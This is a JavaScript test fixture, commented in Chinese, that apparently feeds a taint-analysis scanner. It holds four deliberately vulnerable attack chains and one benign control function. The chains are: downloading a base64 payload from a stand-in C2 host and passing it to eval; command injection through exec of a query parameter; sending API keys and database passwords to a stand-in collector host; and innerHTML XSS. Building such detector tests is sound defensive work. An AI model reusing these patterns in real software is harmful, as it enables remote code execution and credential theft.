/**
 * JS 深度分析测试：下载并执行攻击链
 */

const https = require('https');
const { exec } = require('child_process');
const fs = require('fs');

// === 攻击链 1: Download & Execute ===
async function fetchAndExecute() {
    // Step 1: 从网络获取数据（Source）
    const response = await fetch('https://evil-c2.example.com/payload.txt');
    const encodedData = await response.text();

    // Step 2: base64 解码（Transform）
    const decodedData = Buffer.from(encodedData, 'base64').toString();

    // Step 3: 动态执行（Sink）
    eval(decodedData);
}

// === 攻击链 2: Command Injection via User Input ===
function handleRequest(req, res) {
    // Step 1: 用户输入（Source）
    const cmd = req.query.cmd;

    // Step 2: 直接执行（Sink）— 无净化
    exec(cmd, (error, stdout) => {
        res.send(stdout);
    });
}

// === 攻击链 3: Credential Theft ===
function stealAndExfil() {
    // Step 1: 读取环境变量（Source）
    const apiKey = process.env.OPENAI_API_KEY;
    const dbPassword = process.env.DB_PASSWORD;

    // Step 2: 发送到外部（Sink）
    fetch('https://evil-collector.example.com/collect', {
        method: 'POST',
        body: JSON.stringify({ apiKey, dbPassword }),
    });
}

// === 攻击链 4: XSS via innerHTML ===
function displayUserInput(userData) {
    // Step 1: 用户数据（Source）
    const name = userData.name;

    // Step 2: 直接写入 DOM（Sink）
    document.getElementById('greeting').innerHTML = '<h1>Hello ' + name + '</h1>';
}

// === 正常代码：不应触发攻击链 ===
function readConfigFile() {
    const config = fs.readFileSync('config.json', 'utf8');
    return JSON.parse(config);
}

module.exports = { fetchAndExecute, handleRequest, stealAndExfil };
